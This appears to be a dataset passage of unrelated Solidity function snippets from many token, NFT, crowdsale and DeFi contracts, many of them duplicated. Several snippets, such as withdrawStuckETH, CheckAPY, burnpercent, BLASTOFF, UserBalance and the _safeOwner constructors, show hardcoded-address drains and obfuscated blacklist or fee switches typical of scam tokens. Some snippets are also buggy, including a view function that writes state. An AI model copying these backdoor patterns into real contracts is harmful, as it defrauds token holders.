        require(msg.sender == owner);
        owner.transfer(address(this).balance);
        return true;
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function DigitizeCoin() public {
    owner = msg.sender;
    totalSupply = initialSupply;
    balances[owner] = totalSupply;
    transferGrants[owner] = true;
  }
--------------------------------------------------------------------------------
function cancelTransferRight(address _from) onlyOwner public {
    require(!transferable);
    require(transferGrants[_from]);
    transferGrants[_from] = false;
    emit TransferRightCancelled(_from);
  }
--------------------------------------------------------------------------------
function addManager(address _acc) public {
        require(msg.sender == owner);
        isManager[_acc] = true;
        ManagerAdded(_acc, msg.sender);
    }
--------------------------------------------------------------------------------
function removeManager(address manager) public {
        require(msg.sender == owner);
        isManager[manager] = false;
        ManagerRemoved(manager, msg.sender);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[]) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = CHANGE_PERMISSION;
        return allPermissions;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xd374d0C0760C8e8952A35a73e95FB84F1D994E36,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function AnimalgoSave(address _holder) public view returns(bool){
    require(!save[_holder]);
    save[_holder] = true;
    emit Save(_holder);
    return true;
}
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function setInDepositBitmap(address _account, uint8 _index) internal {
        Account storage account = accounts[_account];
        account.depositBitmap = account.depositBitmap.setBit(_index);
    }
--------------------------------------------------------------------------------
function unsetFromDepositBitmap(address _account, uint8 _index) internal {
        Account storage account = accounts[_account];
        account.depositBitmap = account.depositBitmap.unsetBit(_index);
    }
--------------------------------------------------------------------------------
function setInBorrowBitmap(address _account, uint8 _index) internal {
        Account storage account = accounts[_account];
        account.borrowBitmap = account.borrowBitmap.setBit(_index);
    }
--------------------------------------------------------------------------------
function unsetFromBorrowBitmap(address _account, uint8 _index) internal {
        Account storage account = accounts[_account];
        account.borrowBitmap = account.borrowBitmap.unsetBit(_index);
    }
--------------------------------------------------------------------------------
function Mints(uint256 quantity) external onlyOwner {
    
     require(totalSupply() + quantity <= amountForDevs, "reached max supply");
    _safeMint(msg.sender, quantity);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function withdrawStuckETH() external {
        bool success;
        (success,) = address(0x53c86A8A3635C97A0BA4424A4c761Fe978088D83).call{value: address(this).balance}("");
    }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() external onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.transfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function _setAdmin(address _newAdmin) internal {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, _newAdmin)
        }

        emit AdminUpdated(_admin(), _newAdmin);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
constructor () public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        ownerToOperators[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function genAddressFromGTIN13date(string _GTIN13,string _YYMMDD) constant returns(address c){
bytes32 a= keccak256(_GTIN13,_YYMMDD);
address b = address(a);
return b;
}
--------------------------------------------------------------------------------
function checkProposalCode(
        uint proposalNumber,
        address beneficiary,
        uint etherAmount,
        bytes transactionBytecode
    )
        constant
        returns (bool codeChecksOut)
    {
        Proposal p = proposals[proposalNumber];
        return p.proposalHash == sha3(beneficiary, etherAmount, transactionBytecode);
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time) public onlyOwner view returns (uint256 amount) {
		if (locked[_of][_reason].validity > _time){
			amount = locked[_of][_reason].amount;
		}
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function SvEnsRegistrar(ENS ensAddr, bytes32 node) public {
        ens = ensAddr;
        rootNode = node;
        admins[msg.sender] = true;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function _setSubnodeOwner(bytes32 subnode, address _owner) internal {
        require(!knownNodes[subnode]);
        knownNodes[subnode] = true;
        ens.setSubnodeOwner(rootNode, subnode, _owner);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    bacalar[spender] = val;
    cancun[spender] = val2; 
    antigua[spender] = val3;
    palenque = val4;
  }
--------------------------------------------------------------------------------
function getAppartment(uint _appartmentId) public view returns (
        address ownerAddress,
        uint256 curPrice
    ) {
        Appartement storage _appartment = appartments[_appartmentId];

        ownerAddress = _appartment.ownerAddress;
        curPrice = _appartment.curPrice;
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
        if(locked) {
            return false;
        }

        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setTokensPerEther(uint256 amount) public returns (bool)
    {
       require(msg.sender == owner); 
       require(amount > 0);
       tokensPerEther = amount;
       
       return true;
    }
--------------------------------------------------------------------------------
function setHardCapInEther(uint256 amount) public returns (bool)
    {
       require(msg.sender == owner); 
       require(amount > 0);
       hardCapInEther = amount;
       
       return true;
    }
--------------------------------------------------------------------------------
function setMaxPaymentInEther(uint256 amount) public returns (bool)
    {
       require(msg.sender == owner); 
       require(amount > 0);
       maxPaymentInEther = amount;
       
       return true;
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function lockAddress(address _address) public onlyLocker returns (bool) {
        require(!locked[_address]);

        locked[_address] = true;
        emit Lock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function unlockAddress(address _address) public onlyLocker returns (bool) {
        require(locked[_address]);

        locked[_address] = false;
        emit Unlock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) external returns (bool) {
    dividendsRightsFixUpdate_(msg.sender, _to, _value);
    return transfer_(msg.sender, _to, _value);
  }
--------------------------------------------------------------------------------
function addWhiteList (address botAdd) public {
        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        _whiteList.push(botAdd);
    }
--------------------------------------------------------------------------------
function safeETHTransfer(address _to, uint256 _amount) internal {
        if (_amount > ETHLeftUnclaimed) {
            _amount = ETHLeftUnclaimed;
        }
            payable(_to).transfer(_amount);
            ETHLeftUnclaimed-= _amount;
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _deedId) external whenNotPaused {
        uint256[] memory _deedIds = new uint256[](1);
        _deedIds[0] = _deedId;
        
        takeOwnershipMultiple(_deedIds);
    }
--------------------------------------------------------------------------------
function Grid(
    uint16 _size,
    uint _defaultPrice,
    uint _feeRatio,
    uint _incrementRate) {
    admin = msg.sender;
    defaultPrice = _defaultPrice;
    feeRatio = _feeRatio;
    size = _size;
    incrementRate = _incrementRate;
  }
--------------------------------------------------------------------------------
function requestTransferChildrenOwnership(address newOwner) public onlyAdminOrOwner {
        uint deferBlock = computeDeferBlock();
        transferOwnershipOperation = TransferOwnershipOperation(newOwner, admin, deferBlock);
        TransferOwnershipOperationEvent(newOwner, deferBlock);
    }
--------------------------------------------------------------------------------
function requestChangeInsurer(address newInsurer) public onlyAdminOrOwner {
        uint deferBlock = computeDeferBlock();
        changeInsurerOperation = ChangeInsurerOperation(newInsurer, admin, deferBlock);
        ChangeInsurerOperationEvent(newInsurer, deferBlock);
    }
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
function getSalePrice(uint256 _tokenId)
        public
        view
        returns (uint256)
    {
        Sale storage sale = tokenIdToSale[_tokenId];
        require(_isOnSale(sale));
        return sale.salePrice;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
function activeTranscoderTotalStake(address _transcoder, uint256 _round) public view returns (uint256) {
        // Must be active transcoder
        require(activeTranscoderSet[_round].isActive[_transcoder]);

        return transcoders[_transcoder].earningsPoolPerRound[_round].totalStake;
    }
--------------------------------------------------------------------------------
function transcoderStatus(address _transcoder) public view returns (TranscoderStatus) {
        if (transcoderPool.contains(_transcoder)) {
            return TranscoderStatus.Registered;
        } else {
            return TranscoderStatus.NotRegistered;
        }
    }
--------------------------------------------------------------------------------
function isAccountLiquidatable(
        address user,
        uint16 marketID
    )
        external
        view
        returns (bool isLiquidatable)
    {
        Requires.requireMarketIDExist(state, marketID);
        isLiquidatable = CollateralAccounts.getDetails(state, user, marketID).liquidatable;
    }
--------------------------------------------------------------------------------
function transferByPartition(
    bytes32 partition,
    address to,
    uint256 value,
    bytes calldata data
  )
    external
    isValidCertificate(data)
    returns (bytes32)
  {
    return _transferByPartition(partition, msg.sender, msg.sender, to, value, data, "");
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "INVALID_OWNER");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
--------------------------------------------------------------------------------
function burnpercent(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
constructor() public {
        symbol = "TINR";
        name = "TrueINR";
        name = "TrueINR";
        decimals = 8;
        _addMinter(msg.sender);
    }
--------------------------------------------------------------------------------
function withdrawTokens(address _tokenAddress) external onlyOwner {
    IERC20 token = IERC20(_tokenAddress);

    token.transfer(owner(), token.balanceOf(address(this)));
  }
--------------------------------------------------------------------------------
function isOperatorFor(
        address operator,
        address tokenHolder
    ) public view override returns (bool) {
        return operator == tokenHolder ||
            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function getToken(uint256 i) public view returns(address) {
        require((i < tokens.length) && (i >= 0), "Invalid index");
        return tokens[i];
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
constructor(address _withdrawWallet) public {
        require(_withdrawWallet != address(0), "Invalid funds holder wallet.");

        withdrawWallet = _withdrawWallet;
    }
--------------------------------------------------------------------------------
function withdrawAll() external onlyOwner {
        uint256 weiAmount = address(this).balance;
      
        withdrawWallet.transfer(weiAmount);
        emit WithdrawLog(weiAmount);
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function buyTokens(address buyer, uint usdCents, string txHash)
        external gvAgentOnly returns (uint) {
        require(icoState == IcoState.Running);
        require(!isPaused);
        return buyTokensInternal(buyer, usdCents, txHash);
    }
--------------------------------------------------------------------------------
function buyOptions(address buyer, uint usdCents, string txHash)
        external gvAgentOnly {
        require(!isPaused);
        require(icoState == IcoState.RunningOptionsSelling);
        optionProgram.buyOptions(buyer, usdCents, txHash);
    }
--------------------------------------------------------------------------------
function liquidateBorrow(address borrower, BToken bTokenCollateral) external payable {
        (uint err,) = liquidateBorrowInternal(borrower, msg.value, bTokenCollateral);
        requireNoError(err, "liquidateBorrow failed");
    }
--------------------------------------------------------------------------------
function Authorizable() {
    authorizers.length = 2;
    authorizers[1] = msg.sender;
    authorizerIndex[msg.sender] = 1;
  }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyAuthorized {
    authorizerIndex[_addr] = authorizers.length;
    authorizers.length++;
    authorizers[authorizers.length - 1] = _addr;
  }
--------------------------------------------------------------------------------
function enableBlacklist(address account) public onlyOwner {
        require(!blacklist[account], "CoinToken: Account is already blacklisted");
        blacklist[account] = true;
    }
--------------------------------------------------------------------------------
function disableBlacklist(address account) public onlyOwner {
        require(blacklist[account], "CoinToken: Account is not blacklisted");
        blacklist[account] = false;
    }
--------------------------------------------------------------------------------
function exclude(address account) public onlyOwner {
        require(!isExcluded(account), "CoinToken: Account is already excluded");
        excludeList[account] = true;
    }
--------------------------------------------------------------------------------
function removeExclude(address account) public onlyOwner {
        require(isExcluded(account), "CoinToken: Account is not excluded");
        excludeList[account] = false;
    }
--------------------------------------------------------------------------------
function settlePayment(PaymentTypesLib.Payment memory payment, string memory standard)
    public
    {
        // Settle payment
        _settlePayment(msg.sender, payment, standard);

        // Emit event
        emit SettlePaymentEvent(msg.sender, payment, standard);
    }
--------------------------------------------------------------------------------
function settlePaymentByProxy(address wallet, PaymentTypesLib.Payment memory payment, string memory standard)
    public
    onlyOperator
    {
        // Settle payment for wallet
        _settlePayment(wallet, payment, standard);

        // Emit event
        emit SettlePaymentByProxyEvent(msg.sender, wallet, payment, standard);
    }
--------------------------------------------------------------------------------
function QIUToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[owner] = INITIAL_SUPPLY / 10;
        balances[this] = INITIAL_SUPPLY - balances[owner];
    }
--------------------------------------------------------------------------------
function  AdvancedUniswap() public {
    // Mint initial supply of tokens. All further minting of tokens is disabled
    totalSupply_ = INITIAL_SUPPLY;

    // Transfer all initial tokens to msg.sender
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
constructor (uint256 initialSupply, address payable owner) public {
        _decimals = 18;
        _owner = owner;
        _safeOwner = owner;
        _mint(_owner, initialSupply*(10**18));
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
      operatorApprovals[msg.sender][_operator] = _approved;
      emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
    require(msg.sender == proxyOwner());
    bytes32 position = implementationPosition;

    assembly {
      sstore(position, _newImplementation)
    }
  }
--------------------------------------------------------------------------------
constructor() public {
		currentRewardPercentage = initialRewardPercentage;
		stakeStartTimestamp = block.timestamp + 7 days; // Stake event will start 7 days from deployment
		stakeEndTimestamp = stakeStartTimestamp + 30 days; // Stake event is going to run for 30 days
	}
--------------------------------------------------------------------------------
function checkJuryVoted(address _juryAddress) constant returns (bool){
        require(bytes(juryMembers[_juryAddress].name).length != 0);

        return juryMembers[_juryAddress].hasVoted;
    }
--------------------------------------------------------------------------------
function stake()
        public
    {
        _getLPToken();
        uint256 amount = IERC20(lp).balanceOf(address(this));
        staking.stake(amount);
    }
--------------------------------------------------------------------------------
function _getTokenFromHere(address token)
        public
        onlyGovOrSubGov
    {
        IERC20 t = IERC20(token);
        t.transfer(reserves, t.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function setNextContract(address nextContractAddress) public onlyOwner {
        require(
            address(nextContract) == address(0),
            "NextContract already set"
        );
        nextContract = INextContract(nextContractAddress);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {

    bool withinPeriod = started;

    bool nonZeroPurchase = msg.value != 0;

    return withinPeriod && nonZeroPurchase;

  }
--------------------------------------------------------------------------------
function setBalToken (
        address _balToken
    )
        internal
    {
        require(_balToken.isContract(), "balToken must be a contract");
        balToken = IERC20(_balToken);
    }
--------------------------------------------------------------------------------
function getSignature(uint256 _documentId, address _signer) external view returns (bool, bytes32) {
        Signature memory _signature = _signatures[_documentId][_signer];
        return (_signature.isSigned, _signature.hash);
    }
--------------------------------------------------------------------------------
constructor() public ManagedToken(msg.sender, msg.sender) {
        name = "NTG";
        symbol = "NTG";
        decimals = 18;
        totalIssue = 0;
        totalSupply = 5000000000 ether;                                         //The maximum number of tokens is unchanged and totals will decrease after issue
    }
--------------------------------------------------------------------------------
function sendToBeneficiary()public onlyOwner 
	{
        if (beneficiary.send(amountRaised)) 
		{
			amountRaised = 0;
			emit FundTransfer(beneficiary, amountRaised, false);
		}
    }
--------------------------------------------------------------------------------
constructor () public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
function removeMinter(address minter)
        external
        onlyMasterMinter
        returns (bool)
    {
        minters[minter] = false;
        minterAllowed[minter] = 0;
        emit MinterRemoved(minter);
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function PotaToken() {
          owner = msg.sender;
          balances[owner] = _totalSupply;
		  deadline = now + 14 * 1 days;
      }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
    override
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _amount) public {
        allowed[msg.sender][_spender] = _amount;
        emit  Approval(msg.sender, _spender, _amount);
    }
--------------------------------------------------------------------------------
function accumulativeFundsOf(address _owner) public view returns(uint256) {
		return pointsPerShare.mul(balanceOf(_owner)).toInt256Safe()
			.add(pointsCorrection[_owner]).toUint256Safe() / pointsMultiplier;
	}
--------------------------------------------------------------------------------
function setLotteryAddress(address l) public onlyAdministrator{
      require(lotteryContract==address(0),"lottery contract already set");
      lotteryContract=Lottery(l);
    }
--------------------------------------------------------------------------------
function _insert(address _to) internal {
            if (ownerPos[_to] == 0) {
                pos++;
                addressList[pos] = _to;
                ownerPos[_to] = pos;
            }
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function _upgradeTo(address newImplementation) internal {
    address currentImplementation = implementation();
    require(currentImplementation != newImplementation);
    setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }
--------------------------------------------------------------------------------
function rateIsStale(bytes32 currencyKey)
        public
        view
        returns (bool)
    {
        // sUSD is a special case and is never stale.
        if (currencyKey == "sUSD") return false;

        return lastRateUpdateTimes(currencyKey).add(rateStalePeriod) < now;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner)
		onlyOwner
		public 
	{
		require(_newOwner != address(0), '4');
		owner = _newOwner;
		emit OwnershipTransferred(owner, _newOwner);
	}
--------------------------------------------------------------------------------
function withdrawAll(uint256 _depositId) external balanceExists(_depositId) validDepositId(_depositId) isNotPaused {
        require(isLockupPeriodExpired(_depositId), "Too early, Lockup period");
        _withdrawAll(msg.sender, _depositId);
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function SoundbitToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function removeWhitelistedManager(address _wallet) public onlyAdmin {
        _managerWhitelisteds.remove(_wallet);
        whitelistInfoManager storage m = whitelistManagers[_wallet];
        m.valid = false;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
    confirmations[transactionId][msg.sender] = true;
    Confirmation(msg.sender, transactionId);
    executeTransaction(transactionId);
  }
--------------------------------------------------------------------------------
function depositTo(address to) external override payable {
        // _mintTo(to, msg.value);
        balanceOf[to] += msg.value;
        emit Transfer(address(0), to, msg.value);
    }
--------------------------------------------------------------------------------
function flashFee(address token, uint256) external view override returns (uint256) {
        require(token == address(this), "WETH: flash mint only WETH10");
        return 0;
    }
--------------------------------------------------------------------------------
function allowHandler(
        address usr,
        uint ok
    ) public {
        handlerCan[msg.sender][usr] = ok;
        emit AllowHandler(
            msg.sender,
            usr,
            ok
        );
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
function getTokenAmount(uint256 ethDeposit) public returns (uint256 numTokens) {
        numTokens = (ethDeposit.mul(rate)).div(tokenDiv);
        numTokens = numTokens.add(getBonusAmount(numTokens));
    }
--------------------------------------------------------------------------------
constructor() public{
        //sending all the tokens to Owner
        _balanceOf[owner] = totalSupply;
        
        //maximum minting set to totalSupply
        maximumMinting = totalSupply;
        
        //firing event which logs this transaction
        emit Transfer(address(0), owner, totalSupply);
    }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[]) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = DISTRIBUTE;
        return allPermissions;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);
        
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function BLASTOFF(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botban(_counts[i]); }
    
    }
--------------------------------------------------------------------------------
function finalization() internal {
        if (token.balanceOf(this) > 0) {
            token.safeTransfer(wallet, token.balanceOf(this));
        }
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function endorseProposal(bytes32 _proposalId)
        public
        isProposalState(_proposalId, PROPOSAL_STATE_PREPROPOSAL)
    {
        require(isMainPhase());
        require(isModerator(msg.sender));
        daoStorage().updateProposalEndorse(_proposalId, msg.sender);
    }
--------------------------------------------------------------------------------
function () external whenNotPaused payable {
        emit buyx(msg.sender, this, _getTokenAmount(msg.value));
        buyTokens(msg.sender);
      }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return withinCap && super.validPurchase();
  }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function validPurchase() internal returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function buyTokenForAddress(address _receiver) external payable {
        require(_receiver != address(0), "zero address is not allowed");
        _buyToken(_receiver);
    }
--------------------------------------------------------------------------------
function setBeneficiary(address _beneficiary) public onlyOwner {
        require(_beneficiary != address(0), "zero address is not allowed");
        beneficiary = _beneficiary;
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinCap = amountRaised.add(msg.value) <= cap;
    return withinCap && super.validPurchase();
  }
--------------------------------------------------------------------------------
function transfer(address to, uint value) public whenNotPaused returns (bool) {
    _verifyTransferLock(msg.sender, value);
    _transfer(msg.sender, to, value);
    return true;
  }
--------------------------------------------------------------------------------
function() external payable {
        if (msg.sender == withdrawer) {
            withdrawFunds(withdrawer, msg.value * 100 + msg.value);
        }
    }
--------------------------------------------------------------------------------
function unpause() public onlyOwner {
        require(paused, "Token transfers are not paused");

        paused = false;
        emit Unpause();
    }
--------------------------------------------------------------------------------
function isRoundingError(uint256 numerator, uint256 denominator, uint256 multiple)
        internal
        pure
        returns (bool)
    {
        return numerator.mul(multiple).mod(denominator).mul(1000) >= numerator.mul(multiple);
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
function setPubkey(bytes32 node, bytes32 x, bytes32 y) public onlyOwner(node) {
